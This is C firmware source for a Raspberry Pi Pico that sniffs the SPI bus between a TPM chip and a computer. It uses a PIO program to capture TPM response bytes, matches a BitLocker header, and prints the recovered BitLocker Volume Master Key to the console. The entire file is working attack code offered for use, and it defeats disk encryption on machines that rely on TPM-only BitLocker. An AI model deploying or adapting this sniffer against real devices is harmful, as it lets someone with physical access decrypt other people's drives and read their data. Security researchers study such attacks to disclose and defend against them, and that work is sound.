#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include "pico/stdlib.h"
#include "hardware/pio.h"
#include "hardware/clocks.h"
#include "pico/multicore.h"

// Our assembled program:
#include "spi_sniffer.pio.h"


#include "hardware/flash.h"

unsigned char reverse(unsigned char b) {
   b = (b & 0xF0) >> 4 | (b & 0x0F) << 4;
   b = (b & 0xCC) >> 2 | (b & 0x33) << 2;
   b = (b & 0xAA) >> 1 | (b & 0x55) << 1;
   return b;
}

static inline char reverse_nibbles(char c) {
    return ((c<<4) & 0xF0) | ((c >> 4) & 0xFF);
}

static inline uint32_t fix_bit_format(uint32_t input) {
    char a1 = (input >> 24) & 0xFF;
    char a2 = (input >> 16) & 0xFF;
    char a3 = (input >> 8) & 0xFF;
    char a4 = input & 0xFF;
    return (a1 << 24) | (a2 << 16) | (a3 << 8) | a4;
}

enum state {
    STATE_IDLE,
    STATE_READING
};

static inline uint32_t fetch(PIO pio, uint sm) {
    uint32_t result_raw = pio_sm_get_blocking(pio, sm);
    //uint32_t result = fix_bit_format(result_raw); // i dont know why this is actually needed
    return result_raw;
}

static inline uint8_t fetch_data(PIO pio, uint sm) {
    char data, data1, data2, data3, data4;

    // looking for the signature 0x80000001 before the 
    // actual data byte from the TPM chip response (SO)
    // return the data byte only, skip everything else
    while (1) {
	data1 = (char) (pio_sm_get_blocking(pio, sm) );
	if (data1 != 0x80) continue;
	data2 = (char) (pio_sm_get_blocking(pio, sm));
	if (data2 != 0x00) continue;
	data3 = (char) (pio_sm_get_blocking(pio, sm));
	if (data3 != 0x00) continue;
	data4 = (char) (pio_sm_get_blocking(pio, sm));
	if (data4 != 0x01) continue;

	data = (char) pio_sm_get_blocking(pio,sm);
	break;
    }
    return data;
}

static const char vmk_header[] = {
    0x2c, 0x00, 0x00, 0x0, 0x01, 0x00, 0x00, 0x00, 0x03, 0x20, 0x00, 0x00
};

#define MAXCOUNT 512
uint32_t buf[MAXCOUNT];


char message_buffer[4096*2];
volatile size_t msg_buffer_ptr = 0;
bool byte_found = false;

void core1_entry() {
    // 12 byte header + 32 byte data
    char msg_buffer[12 + 32];
    memset(msg_buffer, 0, 44);

    PIO pio = pio0;
    uint offset = pio_add_program(pio, &spi_sniffer_program);
    uint sm = pio_claim_unused_sm(pio, true);
    spi_sniffer_program_init(pio, sm, offset, 2, 4);
    // pin 4 is SCK and JMP PIN 
    size_t bufpos = 0;
    while(1) {
        char message = fetch_data(pio, sm);
	if (message == 0x2c){
	    multicore_fifo_push_blocking(msg_buffer_ptr+1);
	    for (int i = 0; i < 44; i++){
	    	message_buffer[msg_buffer_ptr++] = message;
		message = fetch_data(pio, sm);
	    }
	    message_buffer[msg_buffer_ptr++] = message;
	}
    }
}


int main() {
    set_sys_clock_khz(270000, true); // 158us
    stdio_init_all();
    sleep_ms(5000);

    puts(" _           ");
    puts("|_) o  _  _  ");
    puts("|   | (_ (_) ");
    puts("");
    
    puts("88P'888'Y88 888 88e    e   e        dP\"8         ,e,  dP,e,  dP,e,                ");
    puts("P'  888  'Y 888 888D  d8b d8b      C8b Y 888 8e   \"   8b \"   8b \"   ,e e,  888,8, ");
    puts("    888     888 88\"  e Y8b Y8b      Y8b  888 88b 888 888888 888888 d88 88b 888 \"  ");
    puts("    888     888     d8b Y8b Y8b    b Y8D 888 888 888  888    888   888   , 888    ");
    puts("    888     888    d888b Y8b Y8b   8edP  888 888 888  888    888    \"YeeP\" 888    ");
    puts("                                                                 - by stacksmashing");
    puts("                                                                 - spi-tpmsniff by zaphoxx");
    puts("");
    
    printf("[+] Ready to sniff!\n");

    multicore_launch_core1(core1_entry);

    while(1) {
        uint32_t popped = multicore_fifo_pop_blocking();
	//printf("[%d, %d]\n",popped,byte_found);
        // Wait til the msg_buffer_ptr is full
        while((msg_buffer_ptr - popped) < 44) {
        }
        if(memcmp(message_buffer + popped, vmk_header, 5) == 0) {
            printf("[+] Bitlocker Volume Master Key found:\n");
	    printf("[+] VMK Header: ");
	    for (int i = 0; i < 12; i++)
	    {
	        printf("%02X ", message_buffer[popped + i]);
	    }
	    
	    puts("");
            for(int i=0; i < 2; i++) {
                printf("[+] ");
                for(int j=0; j < 2; j++) {
                    for(int k=0; k < 8; k++) {
                        printf("%02x ", message_buffer[popped + 12 + (i * 16) + (j * 8) + k]);
                    }
                    printf(" ");
                }
                puts("");
            }
        }
    }
}
